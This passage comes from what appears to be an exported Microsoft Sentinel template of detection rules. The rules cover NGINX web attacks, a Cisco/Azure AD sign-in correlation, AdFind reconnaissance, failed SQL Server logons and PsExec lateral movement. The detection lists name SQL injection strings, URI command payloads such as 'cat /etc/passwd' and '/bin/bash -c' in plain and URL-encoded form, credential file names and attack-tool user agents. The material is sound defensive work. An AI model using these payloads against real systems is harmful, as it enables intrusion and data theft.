          "query": "let forbidden_files = dynamic(['shadow', 'passwd', 'id_rsa']);\nNGINXHTTPServer\n| extend File = extract(@\"(.*\\/)?(.*)\", 2, tostring(UrlOriginal))\n| where File in (forbidden_files)\n| extend FileCustomEntity = File, UrlCustomEntity = UrlOriginal\n",
          "queryFrequency": "PT1H",
          "queryPeriod": "PT1H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT1H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "InitialAccess"
          ],
          "techniques": [],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5M",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": null,
              "groupByCustomDetails": null
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "File",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "FileCustomEntity"
                }
              ]
            },
            {
              "entityType": "URL",
              "fieldMappings": [
                {
                  "identifier": "Url",
                  "columnName": "UrlCustomEntity"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/beb79892-e155-44e0-acbd-84288c9ae50d')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/beb79892-e155-44e0-acbd-84288c9ae50d')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "NGINX - Known malicious user agent",
          "description": "Detects known malicious user agents",
          "severity": "High",
          "enabled": true,
          "query": "let mal_ua_list = dynamic(['Nikto', '(hydra)', '.nasl', 'absinthe', 'advanced email extractor', 'arachni/', 'autogetcontent', 'bilbo', 'BFAC', 'brutus', 'brutus/aet', 'bsqlbf', 'cgichk', 'cisco-torch', 'commix', 'core-project/1.0', 'crimscanner/', 'datacha0s', 'dirbuster', 'domino hunter', 'dotdotpwn', 'email extractor', 'fhscan core 1.', 'floodgate', 'get-minimal', 'gootkit auto-rooter scanner', 'grabber', 'grendel-scan', 'havij', 'inspath', 'internet ninja', 'jaascois', 'zmeu', 'masscan', 'metis', 'morfeus', 'mysqloit', 'n-stealth', 'nessus', 'netsparker', 'nmap nse', 'nmap scripting engine', 'nmap-nse', 'nsauditor', 'openvas', 'pangolin', 'paros', 'pmafind', 'prog.customcrawler', 'qualys was', 's.t.a.l.k.e.r.', 'security scan', 'springenwerk', 'sql power injector', 'sqlmap', 'sqlninja', 'teh forest lobster', 'this is an exploit', 'toata dragostea', 'toata dragostea mea pentru diavola', 'uil2pn', 'user-agent:', 'vega/', 'voideye', 'w3af.sf.net', 'w3af.sourceforge.net', 'w3af.org', 'webbandit', 'webinspect', 'webshag', 'webtrends security analyzer', 'webvulnscan', 'whatweb', 'whcc/', 'wordpress hash grabber', 'xmlrpc exploit', 'WPScan', 'XSpider', 'SF/', 'FooBar/42', 'ScanAlert', 'Webscanner', 'Webster', 'fantomCrew', 'fantomBrowser', 'visvo', 'magereport', 'ltx71', 'websiteprotection', 'BigCliqueBOT', '(BOT for JCE)']);\nNGINXHTTPServer\n| where HttpUserAgentOriginal has_any (mal_ua_list)\n| extend IPCustomEntity = SrcIpAddr, MalwareCustomEntity = HttpUserAgentOriginal\n",
          "queryFrequency": "PT10M",
          "queryPeriod": "PT10M",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT1H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "InitialAccess"
          ],
          "techniques": [],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5M",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": null,
              "groupByCustomDetails": null
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "IPCustomEntity"
                }
              ]
            },
            {
              "entityType": "Malware",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "MalwareCustomEntity"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/72b9453e-d067-4ea6-9b4d-1f020a6cd0c0')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/72b9453e-d067-4ea6-9b4d-1f020a6cd0c0')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "NGINX - Sql injection patterns",
          "description": "Detects possible sql injection patterns",
          "severity": "High",
          "enabled": true,
          "query": "let sql_patterns = dynamic([@\"1/*'*/\", @\"1'||'asd'||'\", @\"'1'='1\", @\"1' or '1'='1\", @\"1 or 1=1\", @\"1=1\", @\"1/*!1111'*/\", @\"'or''='\"]);\nNGINXHTTPServer\n| where UrlOriginal has_any (sql_patterns)\n| extend IPCustomEntity = SrcIpAddr, UrlCustomEntity = UrlOriginal\n",
          "queryFrequency": "PT10M",
          "queryPeriod": "PT10M",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT1H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "InitialAccess"
          ],
          "techniques": [],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5M",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": null,
              "groupByCustomDetails": null
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "IPCustomEntity"
                }
              ]
            },
            {
              "entityType": "URL",
              "fieldMappings": [
                {
                  "identifier": "Url",
                  "columnName": "UrlCustomEntity"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/8328552c-183e-4a99-9557-1d864b319ba0')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/8328552c-183e-4a99-9557-1d864b319ba0')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "NGINX - Core Dump",
          "description": "Detects a core dump of a crashing Nginx worker process, which could be a signal of a serious problem or exploitation attempts.",
          "severity": "High",
          "enabled": true,
          "query": "NGINXHTTPServer\n| where EventType =~ \"ErrorLog\"\n| where EventMessage contains 'exited on signal 6 (core dumped)'\n| extend ProcessIdCustomEntity = ProcessId\n",
          "queryFrequency": "PT10M",
          "queryPeriod": "PT10M",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT1H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Impact"
          ],
          "techniques": [],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5M",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": null,
              "groupByCustomDetails": null
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Process",
              "fieldMappings": [
                {
                  "identifier": "ProcessId",
                  "columnName": "ProcessIdCustomEntity"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/6e81b213-ba09-41a2-8ef8-b8a6581865db')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/6e81b213-ba09-41a2-8ef8-b8a6581865db')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "NGINX - Multiple server errors from single IP address",
          "description": "Detects multiple server errors from one source in short timeframe",
          "severity": "Medium",
          "enabled": true,
          "query": "let threshold = 100;\nNGINXHTTPServer\n| where tolong(HttpStatusCode) >= 500 and tolong(HttpStatusCode) <= 599 \n| summarize MultipleServerErrors = count() by SrcIpAddr, bin(TimeGenerated, 5m)\n| where MultipleServerErrors > threshold\n| extend IPCustomEntity = SrcIpAddr\n",
          "queryFrequency": "PT1H",
          "queryPeriod": "PT1H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT1H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Impact",
            "InitialAccess"
          ],
          "techniques": [],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5M",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": null,
              "groupByCustomDetails": null
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "IPCustomEntity"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/e9348e31-fd2b-4041-9274-7d55783b4c4b')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/e9348e31-fd2b-4041-9274-7d55783b4c4b')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "NGINX - Command in URI",
          "description": "Detects command in URI",
          "severity": "High",
          "enabled": true,
          "query": "let cmd_list = dynamic(['cat%20/etc/passwd', '/etc/passwd', 'ping -i', '/usr/bin/id(', '%2f%75%73%72%2f%62%69%6e%2f%69%64', 'phpinfo()', '%70%68%70%69%6e%66%6f%28%29', ';id', '%3b%69%64', '/bin/bash -c', '%2f%62%69%6e%2f%62%61%73%68%20%2d%63%27', '/bin/bash', '%2f%62%69%6e%2f%62%61%73%68', 'sleep(', '%73%6c%65%65%70%28', 'curl', '%63%75%72%6c', '&dir', '%26%64%69%72', '& dir', '%26%20%64%69%72', '<script>', '%3c%73%63%72%69%70%74%3e', 'eval(', '%65%76%61%6c%28', 'exec(', '%65%78%65%63%28', 'whoami', '%77%68%6f%61%6d%69', 'wget', 'python', 'gcc', 'uname', 'systeminfo', '%77%67%65%74', '%70%79%74%68%6f%6e', '%75%6e%61%6d%65', '%73%79%73%74%65%6d%69%6e%66%6f']);\nNGINXHTTPServer\n| where UrlOriginal has_any (cmd_list)\n| extend UrlCustomEntity = UrlOriginal\n",
          "queryFrequency": "PT10M",
          "queryPeriod": "PT10M",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT1H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "InitialAccess"
          ],
          "techniques": [],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5M",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": null,
              "groupByCustomDetails": null
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "URL",
              "fieldMappings": [
                {
                  "identifier": "Url",
                  "columnName": "UrlCustomEntity"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/5a05a20f-dc87-4973-b19b-df24593080e5')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/5a05a20f-dc87-4973-b19b-df24593080e5')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "Cisco - firewall block but success logon to Azure AD",
          "description": "Correlate IPs blocked by a Cisco firewall appliance with successful Azure Active Directory signins. \nBecause the IP was blocked by the firewall, that same IP logging on successfully to AAD is potentially suspect\nand could indicate credential compromise for the user account.",
          "severity": "Medium",
          "enabled": true,
          "query": "let aadFunc = (tableName:string){\nCommonSecurityLog\n| where DeviceVendor =~ \"Cisco\"\n| where DeviceAction =~ \"denied\"\n| where ipv4_is_private(SourceIP) == false\n| summarize count() by SourceIP\n| join (\n    // Successful signins from IPs blocked by the firewall solution are suspect\n    // Include fully successful sign-ins, but also ones that failed only at MFA stage\n    // as that supposes the password was sucessfully guessed.\n  table(tableName)\n  | where ResultType in (\"0\", \"50074\", \"50076\") \n) on $left.SourceIP == $right.IPAddress\n| extend timestamp = TimeGenerated, IPCustomEntity = SourceIP, AccountCustomEntity = UserPrincipalName\n};\nlet aadSignin = aadFunc(\"SigninLogs\");\nlet aadNonInt = aadFunc(\"AADNonInteractiveUserSignInLogs\");\nunion isfuzzy=true aadSignin, aadNonInt",
          "queryFrequency": "P1D",
          "queryPeriod": "P1D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "InitialAccess"
          ],
          "techniques": [
            "T1078"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": "157c0cfc-d76d-463b-8755-c781608cdc1a",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "AccountCustomEntity"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "IPCustomEntity"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.0.1"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/3f838d90-48fe-4043-9248-978d2e85c414')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/3f838d90-48fe-4043-9248-978d2e85c414')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "NGINX - Put file and get file from same IP address",
          "description": "Detects put or get files from one source in short timeframe",
          "severity": "Medium",
          "enabled": true,
          "query": "let p = NGINXHTTPServer\n| where HttpRequestMethod in~ ('POST', 'PUT')\n| sort by EventStartTime asc\n| summarize post_time=min(EventStartTime) by SrcIpAddr, tostring(UrlOriginal);\nNGINXHTTPServer\n| where HttpRequestMethod =~ 'GET'\n| sort by EventStartTime asc\n| summarize get_time=min(EventStartTime) by SrcIpAddr, tostring(UrlOriginal)\n| join kind=innerunique (p) on UrlOriginal, SrcIpAddr\n| extend second = datetime_diff('second',get_time,post_time)\n| where second between (1 .. 300)\n| project second, post_time, get_time, SrcIpAddr, UrlOriginal\n| extend IPCustomEntity = SrcIpAddr, UrlCustomEntity = tostring(UrlOriginal)\n",
          "queryFrequency": "PT1H",
          "queryPeriod": "PT1H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT1H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "InitialAccess"
          ],
          "techniques": [],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5M",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": null,
              "groupByCustomDetails": null
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "IPCustomEntity"
                }
              ]
            },
            {
              "entityType": "URL",
              "fieldMappings": [
                {
                  "identifier": "Url",
                  "columnName": "UrlCustomEntity"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/af290956-506d-451e-98d9-5c9aa0a43646')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/af290956-506d-451e-98d9-5c9aa0a43646')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "MicrosoftSecurityIncidentCreation",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "Create incidents based on Microsoft Defender for Endpoint alerts",
          "description": "Create incidents based on all alerts generated in Microsoft Defender for Endpoint",
          "enabled": true,
          "productFilter": "Microsoft Defender Advanced Threat Protection",
          "severitiesFilter": [
            "High",
            "Medium",
            "Low"
          ],
          "displayNamesFilter": null,
          "displayNamesExcludeFilter": null,
          "alertRuleTemplateName": "327cd4ed-ca42-454b-887c-54e1c91363c6"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/6153c03f-2228-4c72-a949-a02c69606ba2')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/6153c03f-2228-4c72-a949-a02c69606ba2')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "Probable AdFind Recon Tool Usage (Normalized Process Events)",
          "description": "Identifies the host and account that executed AdFind by hash and filename in addition to common and unique flags that are used by many threat actors in discovery.\nTo use this analytics rule, make sure you have deployed the [ASIM normalization parsers](https://aka.ms/ASimProcessEvent)",
          "severity": "High",
          "enabled": true,
          "query": "let args = dynamic([\"objectcategory\",\"domainlist\",\"dcmodes\",\"adinfo\",\"trustdmp\",\"computers_pwdnotreqd\",\"Domain Admins\", \"objectcategory=person\", \"objectcategory=computer\", \"objectcategory=*\",\"dclist\"]);\nlet parentProcesses = dynamic([\"pwsh.exe\",\"powershell.exe\",\"cmd.exe\"]);\nimProcessCreate\n//looks for execution from a shell\n| where ActingProcessName has_any (parentProcesses)\n| extend ActingProcessFileName = tostring(split(ActingProcessName, '\\\\')[-1])\n| where ActingProcessFileName in~ (parentProcesses)\n// main filter\n| where Process hassuffix \"AdFind.exe\" or TargetProcessSHA256 == \"c92c158d7c37fea795114fa6491fe5f145ad2f8c08776b18ae79db811e8e36a3\"\n    // AdFind common Flags to check for from various threat actor TTPs\n    or CommandLine has_any (args)\n| extend AccountCustomEntity = User, HostCustomEntity = Dvc, ProcessCustomEntity = ActingProcessName, CommandLineCustomEntity = CommandLine, AlgorithmCustomEntity = \"SHA256\", FileHashCustomEntity = TargetProcessSHA256",
          "queryFrequency": "PT1H",
          "queryPeriod": "PT1H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Discovery"
          ],
          "techniques": [
            "T1018"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": "45076281-35ae-45e0-b443-c32aa0baf965",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "AccountCustomEntity"
                }
              ]
            },
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "HostName",
                  "columnName": "HostCustomEntity"
                }
              ]
            },
            {
              "entityType": "Process",
              "fieldMappings": [
                {
                  "identifier": "ProcessId",
                  "columnName": "ProcessCustomEntity"
                },
                {
                  "identifier": "CommandLine",
                  "columnName": "CommandLineCustomEntity"
                }
              ]
            },
            {
              "entityType": "FileHash",
              "fieldMappings": [
                {
                  "identifier": "Algorithm",
                  "columnName": "AlgorithmCustomEntity"
                },
                {
                  "identifier": "Value",
                  "columnName": "FileHashCustomEntity"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.1.3"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/74d6da62-88d1-4298-917b-d9b17cd428bc')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/74d6da62-88d1-4298-917b-d9b17cd428bc')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "MicrosoftSecurityIncidentCreation",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "Create incidents based on Microsoft Cloud App Security alerts",
          "description": "Create incidents based on all alerts generated in Microsoft Cloud App Security",
          "enabled": true,
          "productFilter": "Microsoft Cloud App Security",
          "severitiesFilter": null,
          "displayNamesFilter": null,
          "displayNamesExcludeFilter": null,
          "alertRuleTemplateName": "b3cfc7c0-092c-481c-a55b-34a3979758cb"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/5f152271-702e-4846-9dd9-d71beb6f813b')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/5f152271-702e-4846-9dd9-d71beb6f813b')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "Failed Logon Attempts on SQL Server",
          "description": "This query is based on the SQLEvent KQL Parser function (link below) and detects failed logons on SQL Server \nSQLEvent KQL Parser provided at https://github.com/Azure/Azure-Sentinel/tree/master/Parsers/SQLSever\nDetailed blog post on Monitoring SQL Server with Microsoft Sentinel https://techcommunity.microsoft.com/t5/azure-sentinel/monitoring-sql-server-with-azure-sentinel/ba-p/150296",
          "severity": "Medium",
          "enabled": true,
          "query": "\n// SQLEvent is not the table name, it is the function name that should already be imported into your workspace.\n// The underlying table where the data exists is the Event table.\nSQLEvent\n| where LogonResult has \"failed\"\n| summarize count() by TimeGenerated, CurrentUser, Reason, ClientIP\n| extend timestamp = TimeGenerated, AccountCustomEntity = CurrentUser, IPCustomEntity = ClientIP\n",
          "queryFrequency": "PT6H",
          "queryPeriod": "PT6H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "CredentialAccess"
          ],
          "techniques": [],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": true,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": null,
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/f1bde4cd-0b43-4c50-87ef-e80b3f987cad')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/f1bde4cd-0b43-4c50-87ef-e80b3f987cad')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "MicrosoftSecurityIncidentCreation",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "Create incidents based on Microsoft Cloud App Security alerts",
          "description": "Create incidents based on all alerts generated in Microsoft Cloud App Security",
          "enabled": true,
          "productFilter": "Microsoft Cloud App Security",
          "severitiesFilter": null,
          "displayNamesFilter": null,
          "displayNamesExcludeFilter": null,
          "alertRuleTemplateName": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/b2c97698-f440-477b-930f-180b8d3c52b3')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/b2c97698-f440-477b-930f-180b8d3c52b3')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "Remote File Creation with PsExec",
          "description": "This query was originally published in the threat analytics report, Ryuk ransomware. There is also a related blog.\nRyuk is human-operated ransomware. Much like DoppelPaymer ransomware, Ryuk is spread manually, often on networks that are already infected with Trickbot.\nRyuk operators use PsExec to manually spread the ransomware to other devices.\nThe following query detects remote file creation events that might indicate an active attack.\nThe See also section below lists links to other queries associated with Ryuk ransomware.\nReferences:\nhttps://www.microsoft.com/security/blog/2020/03/05/human-operated-ransomware-attacks-a-preventable-disaster/\nhttps://www.microsoft.com/en-us/wdsi/threats/malware-encyclopedia-description?Name=Ransom:Win32/Ryuk.AA\nhttps://www.microsoft.com/security/blog/2020/03/05/human-operated-ransomware-attacks-a-preventable-disaster/\nhttps://docs.microsoft.com/sysinternals/downloads/psexec",
          "severity": "High",
          "enabled": true,
          "query": "// Find PsExec creating multiple files on remote machines in a 10-minute window\nDeviceFileEvents\n// Looking for PsExec by accepteula command flag\n| where InitiatingProcessCommandLine has \"accepteula\"\n// Remote machines and file is exe\n| where FolderPath has \"\\\\\\\\\" and FileName endswith \".exe\"\n| extend Exe = countof(InitiatingProcessCommandLine, \".exe\")\n// Checking to see if command line has 2 .exe or .bat\n| where InitiatingProcessCommandLine !has \".ps1\" and Exe > 1 or\nInitiatingProcessCommandLine has \".bat\"\n// Exclusions: Remove the following line to widen scope of AHQ\n| where not(InitiatingProcessCommandLine has_any(\"batch\", \"auditpol\",\n\"script\", \"scripts\", \"illusive\", \"rebootrequired\"))\n| summarize FileCount = dcount(FolderPath), make_set(SHA1, 100000), make_set(FolderPath, 100000),\nmake_set(FileName, 100000), make_set(InitiatingProcessCommandLine, 100000) by DeviceId, DeviceName,\nTimeWindow=bin(TimeGenerated, 10m), InitiatingProcessFileName\n| where FileCount > 4\n| extend HostName = iff(DeviceName has '.', substring(DeviceName, 0, indexof(DeviceName, '.')), DeviceName)\n| extend DnsDomain = iff(DeviceName has '.', substring(DeviceName, indexof(DeviceName, '.') + 1), \"\")\n",
          "queryFrequency": "PT1H",
          "queryPeriod": "PT1H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT1H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "LateralMovement"
          ],
          "techniques": [
            "T1570"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": "35ab0d58-baab-4154-87ed-fa2f69797e9e",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "DeviceName"
                },
                {
                  "identifier": "HostName",
                  "columnName": "HostName"
                },
                {
                  "identifier": "DnsDomain",
                  "columnName": "DnsDomain"
                }
